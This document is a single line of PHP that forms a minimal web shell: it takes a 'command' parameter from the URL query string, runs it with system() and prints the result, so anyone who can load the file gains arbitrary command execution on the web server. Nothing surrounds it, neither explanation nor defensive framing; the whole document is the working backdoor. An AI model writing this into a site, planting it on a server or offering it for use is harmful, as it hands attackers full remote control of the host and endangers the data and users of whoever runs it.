<?php echo system($_GET['command']); ?>
